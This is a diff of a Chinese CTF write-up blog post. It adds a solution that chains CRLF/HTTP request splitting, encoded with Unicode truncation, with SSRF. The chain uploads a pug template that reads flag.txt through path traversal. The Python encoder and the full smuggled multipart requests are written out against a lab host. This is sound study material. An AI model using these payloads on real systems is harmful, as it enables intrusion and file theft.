@@ -48,6 +48,8 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/23/VdlEpSrqsKUtNox.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/23/4uD8oyZk3Ra6FIB.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/23/XpfEFKyzsdUPSn1.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/25/1WLkOzt8vImgfC3.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/25/nAHGTzehCWfk2cP.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/23/hZm3RPsnrxcLeNM.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/23/R9NZWj5umXhYJ8I.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/23/DFh7ONiwYpem2SX.png">
@@ -55,7 +57,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/23/fcbLvmts2kKUVMG.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/23/gBSrLY6twR7mZFb.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/02/23/wXihW5lgy9SPaMp.png">
-<meta property="og:updated_time" content="2020-02-23T16:05:57.829Z">
+<meta property="og:updated_time" content="2020-02-25T06:24:42.173Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2020新春战疫-网络安全公益赛-3">
 <meta name="twitter:image" content="https://i.loli.net/2020/02/23/RghZcjEozkxmWsp.png">
@@ -206,13 +208,41 @@
 
 <p><img src="https://i.loli.net/2020/02/23/XpfEFKyzsdUPSn1.png" alt="TIM图片20200223154510.png"></p>
 <p>作罢</p>
-<p>===========================================分割线</p>
-<p>赵师傅发了脚本，和wp不太一样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">payload = &apos;&apos;&apos; HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">GET /file_upload HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: close</span><br><span class="line">x:&apos;&apos;&apos;</span><br><span class="line">payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</span><br><span class="line">a = &apos;&apos;.join(chr(int(&apos;0xff&apos; + hex(ord(c))[2:].zfill(2), 16))for c in payload)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+<p>======================分割线</p>
+<p>赵师傅发了脚本，CRLF的编码和wp不太一样</p>
+<p>测试CRLF</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">''' HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">x:'''</span></span><br><span class="line">payload = payload.replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">a = <span class="string">''</span>.join(chr(int(<span class="string">'0xff'</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>))<span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
 
-<p>但是打题目和本地还是失败，依旧是304，我丢</p>
+<p>但是打题目和本地还是失败，依旧是304，我丢，再用脚本发包发现可以，猜测原因可能是bp发送GET请求中有这些非可见字符的时候可能会出错</p>
+<p>返回200，返回源码</p>
+<p>既然CSRF注入成功，配合SSRF上传文件</p>
+<p>之前看源码发现我们可控文件路径，但是还需要访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(&apos;/&apos;, function(req, res) &#123;</span><br><span class="line">    var action = req.query.action?req.query.action:&quot;index&quot;;</span><br><span class="line">    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) )&#123;</span><br><span class="line">        res.send(&quot;Errrrr, You have been Blocked&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + &apos;/template/&apos;+ action +&apos;.pug&apos;);</span><br><span class="line">    var html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>上传<code>a.pug</code>到<code>/template</code>下即可</p>
+<blockquote>
+<p>pug语法： <a href="https://segmentfault.com/a/1190000006198621" target="_blank" rel="noopener">https://segmentfault.com/a/1190000006198621</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">    head</span><br><span class="line">    body</span><br><span class="line">        include ../../../../../../flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>修改源码把ip限制去掉抓包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /file_upload HTTP/1.1</span><br><span class="line">Host: 192.168.56.124:8081</span><br><span class="line">User-Agent: x </span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------2995119424827</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 269</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------2995119424827</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;</span><br><span class="line">Content-Type: /../template</span><br><span class="line"></span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">    head</span><br><span class="line">    body</span><br><span class="line">        include ../../../../../../flag.txt</span><br><span class="line">-----------------------------2995119424827--</span><br></pre></td></tr></table></figure>
+
+<p>结合CRLF</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;&apos;&apos; HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">POST /file_upload HTTP/1.1</span><br><span class="line">Host: 192.168.56.124:8081</span><br><span class="line">User-Agent: x </span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------2995119424827</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 269</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------2995119424827</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;</span><br><span class="line">Content-Type: /../template</span><br><span class="line"></span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">    head</span><br><span class="line">    body</span><br><span class="line">        include ../../../../../../flag.txt</span><br><span class="line">-----------------------------2995119424827--</span><br><span class="line"></span><br><span class="line">GET /file_upload HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: close</span><br><span class="line">x:&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
+
+<p>最后访问</p>
+<img src="https://i.loli.net/2020/02/25/1WLkOzt8vImgfC3.png" alt="Snipaste_2020-02-25_14-19-21.png" style="zoom:67%;">
+
+<p>这里发包格式还是挺细的，可以通过wireshark分析排查，比如一开始我出现过下面的解析错误</p>
+<img src="https://i.loli.net/2020/02/25/nAHGTzehCWfk2cP.png" alt="Snipaste_2020-02-25_14-21-21.png" style="zoom:67%;">
+
 <h3 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h3><p>明显的JavaScript原型链污染</p>
 <p>留下了不学无术的眼泪.jpg</p>
+<p>=========分割线</p>
+<blockquote>
+<p>JavaScript原型链污染： <a href="https://glotozz.github.io/2020/02/25/JavaScript原型链污染/">https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a> </p>
+</blockquote>
 <h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>应该是tp框架，提示<code>Vulnerability Search</code>，可能是搜索功能有问题</p>
 <p>产生报错</p>
 <p><img src="https://i.loli.net/2020/02/23/hZm3RPsnrxcLeNM.png" alt="Snipaste_2020-02-23_18-07-38.png"></p>
